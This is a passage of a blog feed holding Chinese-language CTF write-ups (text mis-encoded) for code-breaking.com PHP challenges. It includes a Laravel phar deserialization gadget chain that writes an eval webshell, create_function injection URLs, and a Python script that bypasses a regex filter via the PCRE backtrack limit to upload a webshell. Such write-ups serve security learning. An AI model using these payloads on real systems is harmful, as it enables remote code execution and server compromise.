æœåŠ¡å™¨ï¼ŒæŠ“åŒ…æ‹¿åˆ°å›¾ç‰‡è·¯å¾„ã€‚</p><p>è®¿é—®<code>http://51.158.73.123:8080/server/editor?action=catchimage&amp;source[]=phar:///var/www/html/upload/image/65628379e91fb1adb860f98cd9f49712/201901/23/bed4111d42fb35cfdcff.gif</code> æˆåŠŸæ‰§è¡Œ</p><img src="/2019/01/24/code-breaking-lumenserial/1.png"><p>æˆ‘ä»¬çŸ¥é“äº†æœåŠ¡å™¨çš„phpç‰ˆæœ¬æ˜¯å¾ˆæ–°çš„7.2.12ï¼Œè¿˜æœ‰ä¸€äº›ç›¸å…³çš„phpä¿¡æ¯ã€‚</p><p>ä¸ºäº†è§£å†³å‚æ•°é—®é¢˜ï¼Œå¿…é¡»è¦å¼•å…¥å…¶ä»–çš„ç±»ï¼Œä¹‹å‰çš„<code>$this-&gt;event</code>åªèƒ½å¼•ç”¨ä¸€ä¸ªå‚æ•°ã€‚</p><p>è¿˜æ˜¯venenof7å¸ˆå‚…çš„æ–¹æ³•ï¼Œå¦‚æœæœ¬èº«å‚æ•°ä¸èƒ½ä¸ºæ•°ç»„çš„è¯ï¼Œé‚£å°±æ‰¾å…¶ä»–å®ä¾‹çš„æ–¹æ³•ï¼Œç„¶ååœ¨å…¶ä»–å®ä¾‹çš„æ–¹æ³•ä¸­å†æ¬¡æ„é€ å¯ä»¥æ§åˆ¶çš„æ‰§è¡Œå‡½æ•°å¹¶ä¸”å‚æ•°ä¹Ÿèƒ½æ§åˆ¶ã€‚</p><p>è¿™é‡Œæ‰¾åˆ°çš„æ˜¯<code>ReturnCallback</code>å’Œ<code>StaticInvocation</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReturnCallback</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">public function invoke(Invocation $invocation)&#123;</span><br><span class="line"><span class="keyword">return</span> \call_user_func_array(<span class="keyword">$this</span>-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticInvocation</span> <span class="keyword">implements</span> <span class="title">Invocation</span>, <span class="title">SelfDescribing</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">public function getParameters(): array&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±æœ‰å¯æ§çš„å‡½æ•°å’Œå¯æ§çš„å‚æ•°ã€‚</p><p>æ•´ä¸ªè¿‡ç¨‹å†èµ°ä¸€éï¼Œå»ºè®®å¤§å®¶å¯ä»¥æŠŠæ•´ä¸ªè¿‡ç¨‹ç”¨çº¸ç”»ä¸€ä¸‹ï¼Œå…¨ç”¨è„‘å­æœ‰ç‚¹éš¾ã€‚é¦–å…ˆï¼Œ<code>$this-&gt;events</code>èµ‹å€¼æˆ<code>Generator</code>å®ä¾‹è¿™æ ·å°±ä¼šè°ƒç”¨<code>__call</code>æ‰§è¡Œç¬¬ä¸€ä¸ª<code>call_user_func_array</code>ã€‚å…¶æ¬¡ï¼Œåœ¨ç¬¬ä¸€ä¸ªå‡½æ•°æ‰§è¡Œä¸­è°ƒç”¨<code>invoke</code>æ–¹æ³•ï¼Œé‡Œé¢çš„callbackè®¾ç½®æˆ<code>file_put_contents</code>ï¼Œä¹‹åinvokeçš„å‚æ•°ä¸º<code>StaticInvocation</code>çš„å®ä¾‹ï¼Œå®ä¾‹ä¸­çš„æœ‰æ•°ç»„çš„å‚æ•°å½“åšinvokeè°ƒç”¨çš„ç¬¬äºŒä¸ªå‡½æ•°æ‰§è¡Œä¸­çš„å‚æ•°ã€‚æœ€åå°±å˜æˆäº†ä»»æ„ä»£ç æ‰§è¡Œã€‚ç»™ä¸€ä¸‹payloadã€‚</p><h2 id="é¢˜ç›®payload"><a href="#é¢˜ç›®payload" class="headerlink" title="é¢˜ç›®payload"></a>é¢˜ç›®payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line"><span class="keyword">protected</span> $event;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">parameters</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parameters)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">ReturnCallback</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">callback</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($callback)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$obj_para = array('/var/www/html/upload/image/618.php', '&lt;?php @eval($_GET[618]);?&gt;');</span><br><span class="line">$obj_1 = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($obj_para);</span><br><span class="line">$obj_2 = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback(<span class="string">'file_put_contents'</span>);</span><br><span class="line">$obj_3 = <span class="keyword">array</span>(<span class="string">'dispatch'</span>=&gt;<span class="keyword">array</span>($obj_2, <span class="string">'invoke'</span>));</span><br><span class="line">$obj_4 = <span class="keyword">new</span> Faker\Generator($obj_3);</span><br><span class="line">$obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($obj_4, $obj_1);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'2.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'2.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'2.phar'</span>, <span class="string">'2.gif'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ ·ä¸Šä¼ ä¹‹åæ‰§è¡Œä¸€ä¸‹ä¸Šé¢ç±»ä¼¼çš„è¯­å¥å°±è§¦å‘æ‰§è¡Œç”Ÿæˆwebshellï¼Œç„¶åå°±æ‹¿flagã€‚</p><p><code>http://51.158.73.123:8080/upload/image/618.php?618=var_dump(glob(%27/var/www/*%27));</code></p><p><code>http://51.158.73.123:8080/upload/image/618.php?618=var_dump(file_get_contents(%27/var/www/flag_larave1_b0ne%27));</code></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.venenof.com/live_CTF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.pdf" target="_blank" rel="noopener">http://www.venenof.com/live_CTF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;a href=&quot;#é¢˜ç›®åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;/a&gt;é¢˜ç›®åˆ†æ&lt;/h2&gt;&lt;p&gt;phpçš„laravelæ¡†æ¶çš„å®¡è®¡é¢˜ç›®ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹å¤ç°è¿‡ç¨‹ã€‚æ•´ä½“æ€è·¯æ˜¯venenof7å¸ˆå‚…çš„ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆæ¥çœ‹å…¥å£ï¼Œä¸
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking easyéƒ¨åˆ†é¢˜ç›®writeup</title>
    <link href="https://hurricane618.me/2019/01/10/code-breaking-esay-wp/"/>
    <id>https://hurricane618.me/2019/01/10/code-breaking-esay-wp/</id>
    <published>2019-01-10T06:02:10.000Z</published>
    <updated>2019-01-10T06:45:53.933Z</updated>
    
    <content type="html"><![CDATA[<p>phå¸ˆå‚…çš„ä»£ç å®¡è®¡CTFé¢˜ç›® <code>https://code-breaking.com</code></p><h2 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$actionÂ =Â $_GET[<span class="string">'action'</span>]Â ??Â <span class="string">''</span>;$argÂ =Â $_GET[<span class="string">'arg'</span>]Â ??Â <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,Â $action))Â &#123;</span><br><span class="line">Â Â Â Â show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â $action(<span class="string">''</span>,Â $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿæ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å‘ç°æ­£å¸¸çš„å‡½æ•°åéƒ½ä¸è¡Œï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“è”æƒ³åˆ°è¦åœ¨å‡½æ•°åä¸­åŠ å…¥å…¶å®ƒå­—ç¬¦ï¼Œè¿™é“é¢˜æ²¡æƒ³åˆ°å¯ä»¥ç”¨<code>create_function</code>ï¼Œä¸€å¼€å§‹ä¸€ç›´åœ¨æƒ³å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰ç¬¦åˆè¦æ±‚çš„â€¦â€¦</p><p>æƒ³åˆ°<code>create_function</code>ä¹‹åï¼Œè¦æµ‹è¯•å“ªä¸ªå­—ç¬¦å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œæœ‰å¸ˆå‚…ç”¨äº†burpæµ‹è¯•å‡½æ•°æ˜¯<code>var_dump</code>æ¥fuzzï¼Œæœ€åfuzzå‡ºäº†<code>%5c</code>ï¼Œå°±æ˜¯<code>\</code>ã€‚åœ¨å°å¯†åœˆä¸­å¸ˆå‚…çš„è§£é‡Šæ˜¯PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º<code>\</code> ï¼Œå¦‚æœç›´æ¥å†™<code>function_name()</code>è°ƒç”¨ç›¸å½“äºæ˜¯ç”¨ç›¸å¯¹è·¯å¾„åœ¨è°ƒç”¨å‡½æ•°ï¼Œå¦‚æœå†™æˆ<code>\function_name()</code>ç›¸å½“äºç”¨ç»å¯¹è·¯å¾„è°ƒç”¨å‡½æ•°ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</p><p>å¦‚ä½•åœ¨create_functionä¸­æ‰§è¡Œä»£ç å‘¢ï¼Ÿ<code>http://blog.51cto.com/lovexm/1743442</code></p><p>è¿™ç¯‡æ–‡ç« ä¸­ä»‹ç»äº†åœ¨create_functionä¸­å¦‚ä½•æ³¨å…¥ä»£ç å¹¶ä¸”æ‰§è¡Œã€‚ç®€å•æ¥è¯´æ˜¯é€šè¿‡è¾“å…¥<code>}</code>æ¥é—­åˆå‡½æ•°ï¼Œä¹‹åå†æ³¨å…¥æˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$b = create_function(<span class="string">'$a'</span>, <span class="string">"return 666;"</span>);</span><br><span class="line"><span class="keyword">echo</span> $b;<span class="comment">//lambda_xxx</span></span><br><span class="line">$b(<span class="number">1</span>)<span class="comment">//return 666</span></span><br><span class="line"></span><br><span class="line">è¿™ä¸ªåŒ¿åå‡½æ•°ç­‰æ•ˆäº</span><br><span class="line">lambda_xxx($a)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">å¦‚æœæ³¨å…¥&#125;</span><br><span class="line">lambda_xxx($a)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;&#125;<span class="keyword">eval</span>(<span class="string">"phpinfo()"</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment">è¿™æ ·åœ¨åˆ›å»ºåŒ¿åå‡½æ•°çš„åŒæ—¶ä¼šæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œè¿™é‡Œ/* å’Œ//éƒ½æ˜¯å¯ä»¥çš„</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨èƒ½å¤Ÿæ‰§è¡Œä»£ç äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯é€šè¿‡æ‰§è¡Œä»£ç å¯»æ‰¾flagã€‚è¿™é‡Œå¥—ç”¨ä¸€ä¸‹LoRexxarçš„payloadæ¥æœç´¢æ–‡ä»¶</p><p><code>http://51.158.75.42:8087/?action=%5ccreate_function&amp;arg=return%20666;}eval($_POST[%27618%27]);/*</code></p><p><code>618=$handle = opendir(&#39;../&#39;);while(($filename = readdir($handle)) !== false){echo $filename.&quot;&lt;br/&gt;&quot;;}</code></p><img src="/2019/01/10/code-breaking-esay-wp/1.png"><p>è¿™æ ·ç›´æ¥file_get_contentsè·å–å†…å®¹</p><p><code>618=print(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));</code></p><h2 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>Â <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">return</span>Â preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>,Â $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES))Â &#123;</span><br><span class="line">Â Â Â Â <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;$user_dirÂ =Â <span class="string">'data/'</span>Â .Â md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);$dataÂ =Â file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span>Â (is_php($data))Â &#123;</span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">"badÂ request"</span>;</span><br><span class="line">&#125;Â <span class="keyword">else</span>Â &#123;</span><br><span class="line">Â Â Â Â @mkdir($user_dir,Â <span class="number">0755</span>);</span><br><span class="line">Â Â Â Â $pathÂ =Â $user_dirÂ .Â <span class="string">'/'</span>Â .Â random_int(<span class="number">0</span>,Â <span class="number">10</span>)Â .Â <span class="string">'.php'</span>;</span><br><span class="line">Â Â Â Â move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],Â $path);</span><br><span class="line">Â Â Â Â header(<span class="string">"Location:Â $path"</span>,Â <span class="keyword">true</span>,Â <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæ–‡ä»¶å†…å®¹ä¸èƒ½æœ‰<code>&lt;?</code>ï¼Œè¿™æ ·å°±æ„å‘³ç€æ­£å¸¸çš„phpæ–‡ä»¶å®Œå…¨ggï¼Œç„¶åä¹Ÿå¯ä»¥çœ‹åˆ°æ–‡ä»¶åä¸å¯æ§ï¼Œè¿™å°±æ˜¯è¯´æ²¡æœ‰åŠæ³•ç”¨æ–‡ä»¶åä¼ è¾“phpæ•°æ®ã€‚è¿™é“é¢˜å‚è€ƒäº†phå¸ˆå‚…çš„æ–¹æ³•ã€‚</p><p>phå¸ˆå‚…çš„æ–¹æ³•æ˜¯åˆ©ç”¨äº†phpæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œä¸€èˆ¬çš„è¯­è¨€åœ¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ—¶å€™ä¼šæœ‰å›æº¯æ“ä½œï¼Œæ¯”å¦‚åœ¨è´ªå©ªæˆ–è€…éè´ªå©ªæ¨¡å¼ä¸‹ï¼Œä¸€å¼€å§‹åŒ¹é…çš„å†…å®¹ä¼šä¸ºæœ€å¤§åŒ¹é…ï¼Œä¹‹åä¼šæ ¹æ®æ­£åˆ™è¡¨è¾¾å¼çš„å†…å®¹è¿›è¡Œå›æº¯è°ƒæ•´ã€‚ç„¶è€Œphpæœ‰ä¸€ä¸ªå›æº¯çš„æ¬¡æ•°é™åˆ¶ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªé™åˆ¶æ­£åˆ™è¡¨è¾¾å¼å°±ä¼šè¿”å›falseï¼Œåˆç”±äºphpçš„å¼±ç±»å‹æ¯”è¾ƒï¼Œè¿™æ ·å°±ä¼šç»•è¿‡ifçš„åˆ¤æ–­ã€‚</p><p>è¿™é‡Œæœ‰é¸Ÿå“¥çš„ä¸€ç¯‡æ–‡ç« ä»‹ç»phpæ­£åˆ™åŒ¹é…çš„å›æº¯é™åˆ¶</p><p><a href="http://www.laruence.com/2010/06/08/1579.html" target="_blank" rel="noopener">http://www.laruence.com/2010/06/08/1579.html</a></p><p>phå¸ˆå‚…çš„è¯¦ç»†å†…å®¹</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>è¿™é‡Œåœ¨ä¸Šä¼ çš„æ–‡ä»¶ä¸­åŠ å…¥1000000ä¸ªaå°±ä¼šè¶…è¿‡å›æº¯çš„æ¬¡æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsimport iosession = requests.session()</span><br><span class="line">agent = <span class="string">'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM;'</span> \</span><br><span class="line"><span class="string">' Touch; NOKIA; Lumia 920)'</span></span><br><span class="line">headers = &#123;   </span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"51.158.75.42:8088"</span>,    </span><br><span class="line"><span class="string">"User-Agent"</span>: agent,    </span><br><span class="line"><span class="string">"Origin"</span>: <span class="string">"https://code-breaking.com/"</span>,</span><br><span class="line">&#125;</span><br><span class="line">files = &#123; </span><br><span class="line"><span class="string">'file'</span>: io.BytesIO(<span class="string">b'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line">html = session.post(<span class="string">'http://51.158.75.42:8088/'</span>, headers=headers, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">print</span> html.headers</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®æ‰“å°å‡ºæ¥çš„å¤´éƒ¨ä¿¡æ¯ï¼Œå¾—åˆ°webshellçš„åœ°å€ <code>data/558cb3b807e236696e9e2c79295d7fee/1.php</code>ï¼Œç„¶åæ„é€ postæ•°æ®æ‰§è¡Œä»£ç ï¼Œæ‹¿flagã€‚</p><p><code>txt=$handler = opendir(&#39;../../../&#39;);while(($filename = readdir($handler)) !== flase){echo $filename.&quot;&lt;br/&gt;&quot;;}</code></p><p><code>txt=print(file_get_contents(&#39;../../../flag_php7_2_1s_c0rrect&#39;));</code></p><h2 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>]))Â &#123;</span><br><span class="line">Â Â Â Â <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;define(<span class="string">'DATA_DIR'</span>,Â dirname(<span class="keyword">__FILE__</span>)Â .Â <span class="string">'/data/'</span>Â .Â md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR))Â &#123;</span><br><span class="line">Â Â Â Â mkdir(DATA_DIR,Â <span class="number">0755</span>,Â <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domainÂ =Â <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>])Â ?Â $_POST[<span class="string">'domain'</span>]Â :Â <span class="string">''</span>;</span><br><span class="line">$log_nameÂ =Â <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>])Â ?Â $_POST[<span class="string">'log'</span>]Â :Â date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctypeÂ html&gt;</span><br><span class="line">&lt;htmlÂ lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;Â Â Â Â </span><br><span class="line">&lt;!--Â RequiredÂ metaÂ tagsÂ --&gt;Â Â Â </span><br><span class="line">&lt;metaÂ charset=<span class="string">"utf-8"</span>&gt;Â Â Â Â </span><br><span class="line">&lt;metaÂ name=<span class="string">"viewport"</span>Â content=<span class="string">"width=device-width,Â initial-scale=1,Â shrink-to-fit=no"</span>&gt;Â Â Â Â </span><br><span class="line">&lt;!--Â BootstrapÂ CSSÂ --&gt;Â Â Â Â </span><br><span class="line">&lt;linkÂ rel=<span class="string">"stylesheet"</span>Â href=<span class="string">"https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css"</span>Â integrity=<span class="string">"sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE="</span>Â crossorigin=<span class="string">"anonymous"</span>&gt;</span><br><span class="line">&lt;title&gt;DomainÂ Detail&lt;/title&gt;Â Â Â </span><br><span class="line">&lt;style&gt;Â Â Â Â preÂ &#123;Â Â Â Â Â Â Â Â </span><br><span class="line">width:Â <span class="number">100</span>%;Â Â Â Â Â Â Â Â </span><br><span class="line">background-color:Â <span class="comment">#f6f8fa;Â Â Â Â Â Â Â Â </span></span><br><span class="line">border-radius:Â <span class="number">3</span>px;Â Â Â Â Â Â Â Â </span><br><span class="line">font-size:Â <span class="number">85</span>%;Â Â Â Â Â Â Â </span><br><span class="line">line-height:Â <span class="number">1.45</span>;Â Â Â Â Â Â Â </span><br><span class="line">overflow:Â auto;Â Â Â Â Â Â Â </span><br><span class="line">padding:Â <span class="number">16</span>px;Â Â Â Â Â Â Â Â </span><br><span class="line">border:Â <span class="number">1</span>pxÂ solidÂ <span class="comment">#ced4da;Â Â Â Â </span></span><br><span class="line">&#125;Â Â Â Â </span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;divÂ class="container"&gt;Â Â Â Â </span><br><span class="line">&lt;divÂ class="row"&gt;Â Â Â Â Â Â Â Â </span><br><span class="line">&lt;divÂ class="col"&gt;Â Â Â Â Â 